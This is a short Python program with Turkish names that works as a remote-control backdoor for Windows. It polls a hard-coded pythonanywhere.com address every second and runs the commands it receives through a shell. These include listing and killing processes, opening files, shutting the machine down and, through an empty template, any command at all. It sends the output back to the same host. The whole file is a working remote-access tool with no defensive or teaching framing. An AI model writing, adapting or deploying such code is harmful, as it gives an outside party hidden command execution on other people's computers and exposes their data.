# BISMILLAHIRRAHMANIRRAHIM #

import urllib.request as req
import subprocess
import os
import time

class nesne:
    def __init__(self, url) -> None:
        self.url = url
        self.last = ""
        self.hizlikomutlar = [
            "tasklist",
            "taskkill /F /IM ",
            "start ",
            "start file:///{}/".format(os.environ["USERPROFILE"].replace("\\","/")),
            "shutdown /s /t 0",
            ""
        ]

    def kos(self):
        while True:
            try:
                time.sleep(1)
                sms = req.urlopen(self.url).read().strip()
                print(sms)
                denemekodu, plaka = sms.split(b"\n\n")
                if self.last == sms: continue
                self.last = sms
                hizli, arg = plaka.split(b" ")[0], b" ".join(plaka.split(b" ")[1:])
                if arg == b"|": arg = b""
                self.yurut(int(hizli.decode()),arg)
            except Exception as e:
                print(e)
                try: req.urlopen(self.url,data=str(e).encode())
                except: pass

    def yurut(self,ind,arg):
        komut = self.hizlikomutlar[ind] + arg.decode()
        cikti = subprocess.run(komut,shell=True,capture_output=True)
        req.urlopen(self.url,data=b"<-STDOUT->\n" + cikti.stdout + b"<-STDERR->\n" + cikti.stderr + b">---<\n")

if __name__ == "__main__":
    url = "http://gghjhgfjh.pythonanywhere.com"
    n = nesne(url)
    n.kos()
